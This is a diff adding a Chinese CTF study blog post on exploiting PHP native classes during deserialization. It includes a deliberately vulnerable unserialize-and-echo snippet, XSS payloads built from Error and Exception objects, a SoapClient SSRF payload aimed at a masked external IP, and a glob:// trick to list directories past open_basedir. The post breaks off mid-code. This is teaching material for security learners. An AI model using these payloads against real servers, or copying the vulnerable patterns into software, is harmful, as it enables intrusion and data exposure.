@@ -1,37 +1,842 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类  Error Exception SoapClient Directorylterator SimpleXMLElement  Error&#x2F;ExceptionError 适用于php7 开启报错  Error类类摘要 1234567891011121314151617E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php原生类">
+<meta property="og:url" content="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/index.html">
+<meta property="og:site_name" content="p0l1st&#39;s blog">
+<meta property="og:description" content="前言新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类  Error Exception SoapClient Directorylterator SimpleXMLElement  Error&#x2F;ExceptionError 适用于php7 开启报错  Error类类摘要 1234567891011121314151617E">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20231215153028854.png">
+<meta property="og:image" content="http://example.com/images/image-20231215153244269.png">
+<meta property="og:image" content="http://example.com/images/image-20231215161339993.png">
+<meta property="og:image" content="http://example.com/images/20210809203839.png">
+<meta property="og:image" content="http://example.com/images/image-20231215162830705.png">
+<meta property="og:image" content="http://example.com/images/image-20231215162844688.png">
+<meta property="article:published_time" content="2023-12-15T09:24:45.000Z">
+<meta property="article:modified_time" content="2023-12-15T09:27:05.884Z">
+<meta property="article:author" content="p0l1">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20231215153028854.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2023/12/15/php原生类/"/>
+
+
+
+
+
+  <title>php原生类 | p0l1st's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">p0l1st's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="p0l1st's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php原生类</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-12-15T17:24:45+08:00">
+                2023-12-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类</p>
+<ul>
+<li>Error</li>
+<li>Exception</li>
+<li>SoapClient</li>
+<li>Directorylterator</li>
+<li>SimpleXMLElement</li>
+</ul>
+<h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h1><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><ul>
+<li>适用于php7</li>
+<li>开启报错</li>
+</ul>
+<h3 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h3><p><strong>类摘要</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br> <br></code></pre></td></tr></table></figure>
+
+<p><strong>类属性</strong></p>
+<ul>
+<li>message：错误消息内容</li>
+<li>code：错误代码</li>
+<li>file：抛出错误的文件名</li>
+<li>line：抛出错误在该文件中的行数</li>
+</ul>
+<p><strong>类方法</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
+</ul>
+<h3 id="使用Error内置类来构造xss"><a href="#使用Error内置类来构造xss" class="headerlink" title="使用Error内置类来构造xss"></a>使用Error内置类来构造xss</h3><p>Error类是php的一个内置类，用于自定义一个Error。由于它内置的__toString()方法，在php7下可能造成xss，常用于反序列化中。</p>
+<p>当php对象被当作字符串输出时，会触发__toString方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231215153028854.png" alt="image-20231215153028854"></p>
+<h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul>
+<li>适用于php5、7</li>
+<li>开启报错</li>
+</ul>
+<h3 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h3><p><strong>类摘要</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span> &#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>类属性</strong></p>
+<ul>
+<li>message：错误消息内容</li>
+<li>code：错误代码</li>
+<li>file：抛出错误的文件名</li>
+<li>line：抛出错误在该文件中的行数</li>
+</ul>
+<p><strong>类方法</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
+</ul>
+<h3 id="使用Exception类构造xss"><a href="#使用Exception类构造xss" class="headerlink" title="使用Exception类构造xss"></a>使用Exception类构造xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>PoC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231215153244269.png" alt="image-20231215153244269"></p>
+<h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>SoapClinet是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端</p>
+<p><strong>类摘要</strong></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">SoapClient &#123;<br>    /* 方法 */<br>   <span class="hljs-keyword"> public</span> __construct ( string|null $wsdl ,<span class="hljs-built_in"> array </span>$options = [] )<br>   <span class="hljs-keyword"> public</span> __call ( string $name ,<span class="hljs-built_in"> array </span>$args )<span class="hljs-keyword"> :</span> mixed<br>   <span class="hljs-keyword"> public</span> __doRequest ( string $request , string $location , string $action ,<span class="hljs-built_in"> int </span>$version , bool $oneWay = false )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getCookies ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> public</span> __getFunctions ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __getLastRequest ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastRequestHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponse ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponseHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getTypes ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __setCookie ( string $name , string|null $value = null )<span class="hljs-keyword"> :</span> void<br>   <span class="hljs-keyword"> public</span> __setLocation ( string $location = <span class="hljs-string">&quot;&quot;</span> )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __setSoapHeaders ( SoapHeader|array|null $headers = null )<span class="hljs-keyword"> :</span> bool<br>   <span class="hljs-keyword"> public</span> __soapCall ( string $name ,<span class="hljs-built_in"> array </span>$args , array|null $options = null , SoapHeader|array|null $inputHeaders = null ,<span class="hljs-built_in"> array </span>&amp;$outputHeaders = null )<span class="hljs-keyword"> :</span> mixed<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当__call方法被触发后，可以发送http和https请求。</p>
+<p>该类构造函数如下</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>第一个参数用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，该参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是将请求发送到SOAP服务器的URL，uri则是SOAP服务的目标命名空间。</li>
+</ul>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>由于环境问题，没有用nc演示</p>
+<h1 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h1><p>Directorylterator类提供了一个用于查看文件系统目录内容的简单接口</p>
+<p>Directorylterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可用来列举指定目录下的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>输入?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*即可列出根目录下的文件</p>
+<p><img src="/../images/image-20231215161339993.png" alt="image-20231215161339993"></p>
+<h1 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h1><p>与Directorylterator类相同，提供了一个用于查看文件系统目录内容的简单接口</p>
+<p>该类的构造方法将会创建一个指定目录的迭代器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h1><p>与filesystemlterator和directorylterator作用类似，也可以遍历一个文件目录，使用方法与前两个也类似</p>
+<p>不同的是其行为类似glob()，可以通过模式匹配来寻找文件路径</p>
+<p><strong>类摘要</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-comment">/* 继承的方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title 